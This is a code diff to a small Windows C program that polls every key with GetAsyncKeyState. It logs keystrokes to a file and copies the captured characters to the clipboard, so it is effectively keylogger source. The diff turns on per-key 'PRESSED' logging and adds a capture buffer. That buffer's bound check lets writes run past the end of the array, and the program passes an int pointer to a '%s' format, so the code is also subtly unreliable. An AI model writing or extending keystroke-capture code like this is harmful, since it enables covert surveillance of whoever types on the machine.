@@ -11,6 +11,7 @@
 
 int Save(int _key, char *file);
 int SaveInt(int number, char *file);
+const int MAX_CHARS = 50;
 
 int main(void){
     int keyPressed = 0;
@@ -39,16 +40,29 @@ int Save(int _key, char *file){
     int activeKey = 1;
     int pressedChars[255+8];
 
+    char allocConvert[50];
+    int numberChars = 0;
+
     for(int iteration = 0; iteration < 255+8; iteration++){
         pressedChars[iteration] = 0;
     }
 
-    while (activeKey == 1){
+    for(int iteration = 0; iteration < 50; iteration++){
+        allocConvert[iteration] = 0;
+    }
+
+    while ((activeKey == 1)){
         Sleep(10);
         for (int i = 8; i < 255; i++){
+            if((numberChars > MAX_CHARS)){
+                activeKey = 0; 
+                break;
+            }
             int keyState = GetAsyncKeyState(i);
             if ((keyState & 0x8000) && (i == 0x42)){
+                activeKey = 0;
                 fprintf(OUTPUT_FILE, "END\n");
+                fclose(OUTPUT_FILE);
                 memcpy(GlobalLock(hMem), allocConvert, sizeof(allocConvert));
                 GlobalUnlock(hMem);
                 OpenClipboard(0);
@@ -56,16 +70,17 @@ int Save(int _key, char *file){
                 SetClipboardData(CF_TEXT, hMem);
                 CloseClipboard();
                 GlobalFree(hMem);
-                fclose(OUTPUT_FILE);
                 break;
             }
             if (!(keyState) && (pressedChars[i] == 1)){
+                allocConvert[numberChars] = i;
+                numberChars++;
                 fprintf(OUTPUT_FILE, "%s", &i);
                 //fprintf(OUTPUT_FILE, "RELEASED:%s,%d\n", &i,i);
                 pressedChars[i] = 0;
             }
             if ((keyState & 0x8000) && (pressedChars[i] == 0)){
-                //fprintf(OUTPUT_FILE, "PRESSED:%s,%d\n", &i,i);
+                fprintf(OUTPUT_FILE, "PRESSED:%s,%d\n", &i,i);
                 pressedChars[i] = 1;
             }
         }
